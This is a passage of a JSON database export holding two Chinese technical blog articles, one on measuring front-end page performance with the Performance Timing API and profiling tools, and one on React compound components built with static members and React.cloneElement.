API\u003c/a\u003e 是一个支持 \u003ccode\u003eInternet Explorer 9\u003c/code\u003e 以上版本及 \u003ccode\u003eWebKit\u003c/code\u003e\n内核浏览器中用于记录页面加载和解析过程中关键时间点的机制，它可以详细记录每个页面资源从开始加载到解析完成这一过程中具体操作发生的时间点，这样根据开始和结束时间戳就可以计算出这个过程所花的时间了。\u003c/p\u003e\n\u003cp\u003e图 \u003cstrong\u003e1-1\u003c/strong\u003e为 \u003cstrong\u003eW3C\u003c/strong\u003e标准中 \u003ccode\u003ePerformance Timing\u003c/code\u003e 资源加载和解析过程记录各个关键点的示意图，浏览器中加载和解析一个 \u003cstrong\u003eHTML\u003c/strong\u003e 文件的详细过程先后经历 \u003cstrong\u003eunload、redirect、App Cache、DNS、TCP、Request、Response、Processing、onload\u003c/strong\u003e 几个阶段，每个过程中开始和结束的关键时间戳浏览器已经使用 \u003ccode\u003eperformance.timing\u003c/code\u003e 来记录了，所以根据这个记录并结合简单的计算，我们就可以得到页面中每个过程所消耗的时间。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Performance Timing API 关键时间点记录\" src=\"https://user-gold-cdn.xitu.io/2017/12/26/1609184e525a8133?w=1473\u0026amp;h=879\u0026amp;f=png\u0026amp;s=62923\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cstrong\u003e图1-1\u003c/strong\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cstrong\u003ePerformance Timing API 关键时间点记录\u003c/strong\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eperformanceTest\u003c/span\u003e\u003c/span\u003e(){\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e timing = performance.timing,\n\u0009readyStart = timing.fetchStart - timing.navigationStart,\n\u0009redirectTime = timing.redirectEnd - timing.redirectStart,\n\u0009appcacheTime = timing.domainLookupStart - timing.fetchStart,\n\u0009unloadEventTime = timing.unloadEventEnd - timing.unloadEventStart,\n\u0009lookupDomainTime = timing.domainLookupEnd - timing.domainLookupStart,\n\u0009connectTime = timing.connectEnd - timing.connectStart,\n\u0009requestTime = timing.responseEnd - timing.requestStart,\n\u0009initDomTreeTime = timing.domInteractive - timing.responseEnd,\n\u0009domReadyTime = timing.domComplete - timing.domInteractive,\n\u0009loadEventTime = timing.loadEventEnd - timing.loadEventStart,\n\u0009loadTime = timing.loadEventEnd - timing.navigationStart;\n\u0009\u0009\u0009\n    console.log(\u003cspan class=\"hljs-string\"\u003e'准备新页面时间耗时：'\u003c/span\u003e+readyStart);\n    console.log(\u003cspan class=\"hljs-string\"\u003e'redirect 重定向耗时：'\u003c/span\u003e+redirectTime);\n    console.log(\u003cspan class=\"hljs-string\"\u003e'Appcache 耗时'\u003c/span\u003e+appcacheTime);\n    console.log(\u003cspan class=\"hljs-string\"\u003e'unload 前文档耗时：'\u003c/span\u003e+unloadEventTime);\n    console.log(\u003cspan class=\"hljs-string\"\u003e'DNS 查询耗时：'\u003c/span\u003e+lookupDomainTime);\n    console.log(\u003cspan class=\"hljs-string\"\u003e'TCP 连接耗时：'\u003c/span\u003e+connectTime);\n    console.log(\u003cspan class=\"hljs-string\"\u003e'request 请求耗时：'\u003c/span\u003e+requestTime);\n    console.log(\u003cspan class=\"hljs-string\"\u003e'请求完毕至DOM加载：'\u003c/span\u003e+initDomTreeTime);\n    console.log(\u003cspan class=\"hljs-string\"\u003e'解析DOM树耗时：'\u003c/span\u003e+domReadyTime);\n    console.log(\u003cspan class=\"hljs-string\"\u003e'Load事件耗时：'\u003c/span\u003e+loadEventTime);\n    console.log(\u003cspan class=\"hljs-string\"\u003e'加载时间耗时：'\u003c/span\u003e+loadTime);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过上面的时间戳计算可以得到几个关键步骤所消耗的时间，对前端有意义的几个过程主要是解析 \u003cstrong\u003eDOM\u003c/strong\u003e 树耗时、\u003cstrong\u003eload\u003c/strong\u003e 事件耗时和整个加载过程耗时等，不过在页面性能获取时我们可以尽量获取更详细的数据信息，以供后面分析。除了资源加载解析的关键点计时，\u003cstrong\u003epreformance\u003c/strong\u003e 还提供了一些其他方面的功能，我们可以根据具体需要进行选择使用。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eperformance.memory      //内存占用的具体数据\nperformance.now()       //performance.now()方法返回当前网页自performance.timing到现在的时间，可以精确到微秒，用于更加精确的计数。但实际上，目前网页性能通过毫秒来计算就足够了\nperformance.getEntries()        //获取页面所有加载资源的performance timing 情况。浏览器获取网页时，会对网页中每一个对象(脚本文件、样式表、图片文件等)发出一个HTTP请求。performance.getEntries 方法以数组形式返回所有请求的时间统计信息\nperformance.navigation      //performance 还可以提供用户行为信息，例如网络请求的类型和重定向次数等，一般都存放在performance.navigation对象里面\nperformance.navigation.redirectCount        //记录当前网页重定向跳转的次数\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003eProfile 工具\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003ePerformance Timing API\u003c/strong\u003e 描述了页面资源从加载到解析各个阶段的执行关键点时间记录，但是无法统计 \u003cstrong\u003eJavaScript\u003c/strong\u003e 执行过程中系统资源的占用情况。\u003cstrong\u003eProfile\u003c/strong\u003e 是 \u003cstrong\u003eChrome\u003c/strong\u003e 和 \u003cstrong\u003eFirefox\u003c/strong\u003e 等标准浏览器提供的一种用于测试页面脚本运行时系统内存和 \u003cstrong\u003eCPU\u003c/strong\u003e 资源占用情况的 \u003cstrong\u003eAPI\u003c/strong\u003e，以 \u003cstrong\u003eChrome\u003c/strong\u003e 浏览器为例，结合 \u003cstrong\u003eProfile\u003c/strong\u003e，可以实现以下几个功能。\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;1.分析页面脚本执行过程中最耗资源的操作\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;2.记录页面脚本执行过程中 \u003cstrong\u003eJavaScript\u003c/strong\u003e 对象消耗的内存与堆栈的使用情况\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;3.检测页面脚本执行过程中 \u003cstrong\u003eCPU\u003c/strong\u003e 占用情况\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003econsole.profile()\u003c/code\u003e 和\u003ccode\u003econsole.profileEnd()\u003c/code\u003e 就可以分析中间一段代码执行时系统的内存或 \u003cstrong\u003eCPU\u003c/strong\u003e 资源的消耗情况，然后配合浏览器的 \u003cstrong\u003eProfile\u003c/strong\u003e 查看比较消耗系统内存或 \u003cstrong\u003eCPU\u003c/strong\u003e 资源的操作，这样就可以有针对性的进行优化了。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econsole.profile();\n//TODOS,需要测试的页面逻辑动作\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0; i \u0026lt; 100000; i ++){\n    console.log(i * i);\n}\nconsole.profileEnd();\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e页面埋点计时\u003c/h4\u003e\n\u003cp\u003e使用\u003cstrong\u003eProfile\u003c/strong\u003e可以在一定程度上帮助我们分析页面的性能，但缺点是不够灵活。实际项目中，我们不会多关注页面的内存或\u003cstrong\u003eCPU\u003c/strong\u003e资源的消耗情况，因为\u003cstrong\u003eJavaScript\u003c/strong\u003e有自动内存回收机制。我们关注更多的是页面脚本逻辑执行的时间。除了\u003cstrong\u003ePerformance Timing\u003c/strong\u003e 的关键过程耗时计算，我们还希望检测代码的具体解析或执行时间，这就不能写很多的\u003ccode\u003econsole.profile()\u003c/code\u003e 和\u003ccode\u003econsole.profileEnd()\u003c/code\u003e来逐段实现，为了更加简单地处理这种情况，往往选择通过脚本埋点计时的方式来统计没部分代码的运行时间。\u003c/p\u003e\n\u003cp\u003e页面 \u003cstrong\u003eJavaScript\u003c/strong\u003e 埋点计时比较容易实现，和 \u003cstrong\u003ePerformance Timing\u003c/strong\u003e 记录时间戳有点类似，我们可以记录 \u003cstrong\u003eJavaScript\u003c/strong\u003e 代码开始执行的时间戳，后面在需要记录的地方埋点记录结束时的时间戳，最后通过差值来计算一段 \u003cstrong\u003eHTML\u003c/strong\u003e 解析或 \u003cstrong\u003eJavaScript\u003c/strong\u003e 解析执行的时间。为了方便操作，可以将某个操作开始和结束的时间戳记录到一个数组中，然后分析数组之间的间隔就得到每个步骤的执行时间，下面来看一个时间点记录和分析的例子。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e timeList = [];\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e addTime(tag) {timeList.push({\u003cspan class=\"hljs-string\"\u003e\"tag\"\u003c/span\u003e:tag,\u003cspan class=\"hljs-string\"\u003e\"time\"\u003c/span\u003e:+new Date()});}\n\naddTime(\u003cspan class=\"hljs-string\"\u003e\"loading\"\u003c/span\u003e);\n\ntimeList.push({\u003cspan class=\"hljs-string\"\u003e\"tag\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"load\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"time\"\u003c/span\u003e:+new Date()});\n//TODOS,load加载时的操作\ntimeList.push({\u003cspan class=\"hljs-string\"\u003e\"tag\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"load\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"time\"\u003c/span\u003e:+new Date()});\n\ntimeList.push({\u003cspan class=\"hljs-string\"\u003e\"tag\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"process\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"time\"\u003c/span\u003e:+new Date()});\n//TODOS,process处理时的操作\ntimeList.push({\u003cspan class=\"hljs-string\"\u003e\"tag\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"process\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"time\"\u003c/span\u003e:+new Date()});\n\nconsole.log(parseTime(timeList));\u0009//输出{load：时间毫秒数，process: 时间毫秒数}\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e parseTime(time) {\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e timeStep={},\n\u0009endTime;\n\u0009\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0,len = time.length; i \u0026lt; len; i ++){\n\u0009    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!time[i]) \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e;\n\n\u0009\u0009endTime = {};\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e j = i+1; j \u0026lt; len; j++){\n\u0009\u0009    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(time[j] \u0026amp;\u0026amp; time[i].tag == time[j].tag){\n\u0009\u0009\u0009    endTime.tag = time[j].tag;\n\u0009\u0009\u0009    endTime.time = time[j].time;\n\u0009\u0009\u0009    time[j] = null;\n\u0009\u0009\u0009}\n\u0009\u0009}\n\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(endTime.time \u0026gt;= 0 \u0026amp;\u0026amp; endTime.tag){\n\u0009\u0009    timeStep[endTime.tag] = endTime.time - time[i].time;\n\u0009\u0009}\n\u0009}\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e timeStep;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这种方式常常在移动端页面中使用，因为移动端浏览器 \u003cstrong\u003eHTML\u003c/strong\u003e 解析和 \u003cstrong\u003eJavaScript\u003c/strong\u003e 执行相对较慢，通常为了性能优化，我们需要找到页面中执行 \u003cstrong\u003eJavaScript\u003c/strong\u003e 耗时的操作，如果将关键 \u003cstrong\u003eJavaScript\u003c/strong\u003e 的执行过程进行埋点计时并上报，就可以轻松找出 \u003cstrong\u003eJavaScript\u003c/strong\u003e 执行慢的地方，并有针对性地进行优化。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e资源加载时序图\u003c/h4\u003e\n\u003cp\u003e我们还可以借助浏览器或其他工具的资源加载时序图来帮助分析页面资源加载过程中的性能问题。这种方法可以粗粒度地宏观分析浏览器的所有资源文件请求耗时和文件加载顺序情况，如保证 \u003cstrong\u003eCSS\u003c/strong\u003e 和数据请求等关键资源优先加载，\u003cstrong\u003eJavaScript\u003c/strong\u003e 文件和页面中非关键性图片等内容延后加载。如果因为某个资源的加载十分耗时而阻塞了页面的内容展示，那就要着重考虑。所以，我们需要通过资源加载时序图来辅助分析页面上资源加载顺序的问题。\u003c/p\u003e\n\u003cp\u003e图 \u003cstrong\u003e1-2\u003c/strong\u003e 为使用 \u003ca target=\"_blank\" href=\"https://www.telerik.com/fiddler\"\u003eFiddler\u003c/a\u003e 抓取浏览器访问地址时的资源加载时序图，图 \u003cstrong\u003e1-3\u003c/strong\u003e 为 \u003cstrong\u003eChrome\u003c/strong\u003e 浏览器访问\u003ca target=\"_blank\" href=\"https://maoyan.com/\"\u003e猫眼电影官网\u003c/a\u003e时的资源加载时序图.根据资源加载时序图我们可以很直观地看到页面上各个资源加载过程所需要的时间和先后顺序，有利于找出加载过程中比较耗时的文件资源，帮助我们有针对性地进行优化。\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/27/16096042768dd0de?w=600\u0026amp;h=198\u0026amp;f=jpeg\u0026amp;s=23478\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cstrong\u003e图1-2\u003c/strong\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cstrong\u003eFiddler 页面加载文件资源时序图\u003c/strong\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/27/160960653e011768?w=1271\u0026amp;h=670\u0026amp;f=png\u0026amp;s=107043\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cstrong\u003e图1-3\u003c/strong\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cstrong\u003eChrome浏览器 猫眼电影官网页面加载文件资源时序图\u003c/strong\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e总结\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e通过上文介绍的利用\u003ccode\u003ePerformance Timing API\u003c/code\u003e、\u003ccode\u003ePrpfile\u003c/code\u003e工具、页面埋点计时、资源加载时序图分析几个方面来获取和衡量一个页面的性能，找出加载过程中比较耗时的文件资源，帮助我们有针对性地进行优化。医病必须诊断找到病因，前端性能测试在前端性能优化中属于诊断工作，只有找到病因，才能进行针对性治疗优化。在此欢迎大家加入QQ前端技术交流群 \u003ccode\u003e544587175\u003c/code\u003e ,在后续我会从桌面浏览器和移动端浏览器两个方面详细讲解不同终端的优化策略，敬请关注......\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514889036.4646","__v":0}
{"_id":{"$oid":"5a4b76da2239bd131cd79f43"},"id":"5a47cd63f265da43224189ef","author":{"$oid":"5a4b76a1b11e1a170cb138d6"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Advanced-react-patterns(2)","meta":{"likeCount":0},"tag":["React.js","前端"],"comment":[],"shortContent":"文本是 ADVANCED-REACT-PATTERNS 第二篇。 首先外层是一个 Toggle组件，包括着内部的子组件。因为外层组件包裹的命名比较清晰。 注意这中间有不太常见的组件使用方式。 Toggle组件是一个 component 类, On 是它的属性，不过既然作为组件使…","content":"\u003cp\u003e文本是 \u003ccode\u003eADVANCED-REACT-PATTERNS\u003c/code\u003e 第二篇。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eStatic 妙用\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eApp\u003c/span\u003e\u003c/span\u003e() {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n    \u0026lt;Toggle\n      onToggle={on =\u0026gt; console.log(\u003cspan class=\"hljs-string\"\u003e'toggle'\u003c/span\u003e, on)}\n    \u0026gt;\n      \u0026lt;Toggle.On\u0026gt;The button is on\u0026lt;/Toggle.On\u0026gt;\n      \u0026lt;Toggle.Off\u0026gt;The button is off\u0026lt;/Toggle.Off\u0026gt;\n      \u0026lt;Toggle.Button /\u0026gt;\n    \u0026lt;/Toggle\u0026gt;\n  )\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e首先外层是一个 Toggle组件，包括着内部的子组件。因为外层组件包裹的命名比较清晰。\u003c/p\u003e\n\u003cp\u003e注意这中间有不太常见的组件使用方式。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;Toggle.On\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eToggle组件是一个 component 类, On 是它的属性，不过既然作为组件使用，说明也是一个 component 类。\n继续研究下 Toggle 组件的实现，去寻找答案。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eclass Toggle extends React.Component {\n  static On = ToggleOn\n  static Off = ToggleOff\n  static Button = ToggleButton\n  static defaultProps = {onToggle: () =\u0026gt; {}}\n  state = {on: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}\n  toggle = () =\u0026gt;\n    this.setState(\n      ({on}) =\u0026gt; ({on: !on}),\n      () =\u0026gt; this.props.onToggle(this.state.on),\n    )\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n    const children = React.Children.map(\n      this.props.children,\n      child =\u0026gt;\n        React.cloneElement(child, {\n          on: this.state.on,\n          toggle: this.toggle,\n        }),\n    )\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;div\u0026gt;{children}\u0026lt;/div\u0026gt;\n  }\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在实际 debug 的时候组件渲染民时最终还是被替换成 \u003ccode\u003e\u0026lt;ToggleOn\u0026gt;\u003c/code\u003e 以及 \u003ccode\u003e\u0026lt;ToggleOff\u0026gt;\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003estatic 是 ES6 中 Class 定义静态方法的关键字。静态方法的好处是在基于类创建新的实例时，新的实例是不会继承静态方法的。（简单来说，不是在原型链上定义的，而是直接挂载在这个类的属性中）\u003c/p\u003e\n\u003cp\u003e这么一看 Static 里面的静态属性引入了外部定义的类(如 ToggleOn)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e ToggleOn({on, children}) {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e on ? children : null\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e ToggleOff({on, children}) {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e on ? null : children\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e ToggleButton({on, toggle, ...props}) {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n    \u0026lt;Switch on={on} onClick={toggle} {...props} /\u0026gt;\n  )\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过 Static 关联组件，是有原因的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用 React.cloneElement 减少子组件相同props传递\u003c/h3\u003e\n\u003cp\u003e在 \u003ccode\u003e\u0026lt;Toggle.On\u0026gt;\u003c/code\u003e 等类似的组件中，我们发现 render 中并没有直接传入 props ，而 ToggleOn 组件就是接受了props，第一个对象为 on, 第二个则是包裹的 children。\u003c/p\u003e\n\u003cp\u003e代码产生的实际效果应该是这样的。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n\u0009\u0026lt;Toggle.On on={this.state.on}\u0026gt;The button is on\u0026lt;/Toggle.On\u0026gt;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们再把思路回溯到 Toggle 的 render 这一方法。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n  const children = React.Children.map(\n    this.props.children,\n    child =\u0026gt;\n      React.cloneElement(child, {\n        on: this.state.on,\n        toggle: this.toggle,\n      }),\n  )\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;div\u0026gt;{children}\u0026lt;/div\u0026gt;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003eReact.cloneElement\u003c/h4\u003e\n\u003cp\u003eReact.cloneElement 接受一个组件，以及可选的props以及children。它的作用就是 clone 一份原先组件并将其替换成新组件。原先组件的 props 会被新传入的 props 浅合并。而新的children 会替换成原来的 children, 不过组件原先的 key 和 ref 会得到保留。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eReact.cloneElement(\n  element,\n  [props],\n  [...children]\n)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e它的实际作用类似于\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;element.type {...element.props} {...props}\u0026gt;{children}\u0026lt;/element.type\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e由于 \u003ccode\u003ethis.props.chidlren\u003c/code\u003e 的数据类型是不确定的，可能是个 Object，也可能是 Array.官方文档推荐使用 React.Chidlren 为 children 提供特定的数据操作。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e新手很有可能编写的代码结构\u003c/h3\u003e\n\u003cp\u003e如果是我自己写的话，基本就是以下结构，并且我相信大部分人一上来也是先写了这段代码，后面再开始优化。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eclass Toggle extends React.Component {\n  static defaultProps = {onToggle: () =\u0026gt; {}}\n  state = {on: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}\n  toggle = () =\u0026gt;\n    this.setState(\n      ({on}) =\u0026gt; ({on: !on}),\n      () =\u0026gt; this.props.onToggle(this.state.on),\n    )\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n    const { on } = this.state\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\u0026lt;div\u0026gt;\n    \u0026lt;ToggleOn on={on}\u0026gt;The button is on\u0026lt;/ToggleOn\u0026gt;\n    \u0026lt;ToggleOff on={on}\u0026gt;The button is off\u0026lt;/ToggleOff\u0026gt;\n    \u0026lt;ToggleButton toggle={this.props.onToggle} /\u0026gt;\n    \u0026lt;/div\u0026gt;\n    )\n  }\n}\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eApp\u003c/span\u003e\u003c/span\u003e() {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n  \u0026lt;Toggle onToggle={on =\u0026gt; console.log(\u003cspan class=\"hljs-string\"\u003e'toggle'\u003c/span\u003e, on)} /\u0026gt;\n  )\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们再对比下就会发现，通过 cloneElemnt 确实可以让我们的结构更加清晰。 而且，还可以少一个包裹的 div 标签。虽然在 React16.2中出现了 \u003ccode\u003e\u0026lt;\u0026gt;\u0026lt;\u0026gt;\u003c/code\u003e 的Fragment 表示可以避免此类问题，但是假设如果还有类似的10个组件需要接受相同的 props，我们要写10遍 \u003ccode\u003eon={on}\u003c/code\u003e,我们应该减少重复劳动。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e分析\u003c/h3\u003e\n\u003cp\u003e如果有批量的子组件需要传递相同的props,那么使用 cloneElemnt 再好不过了。但需要注意的是，这也会给子组件传递一些不必要的数据。比如在这里的 demo 中，ToggleOn 和 ToggleOff 只需要接受 on/off 的props 即可，传入的 toggle 方法是冗余的。我们假设它又接受了与自身所需数据无关的 其他 props, 而该 props 又频繁变更，那么每一次都会得到这些 props 的组件都会 re-render 的可能。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e参考资料\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003ehttps://reactjs.org/docs/react-api.html#cloneelement\u003c/li\u003e\n\u003cli\u003ehttps://doc.react-china.org/docs/react-api.html\u003c/li\u003e\n\u003cli\u003ehttps://mxstbr.blog/2017/02/react-children-deepdive/\u003c/li\u003e\n\u003c/ol\u003e\n","buildTime":"1514894423.1475","__v":0}
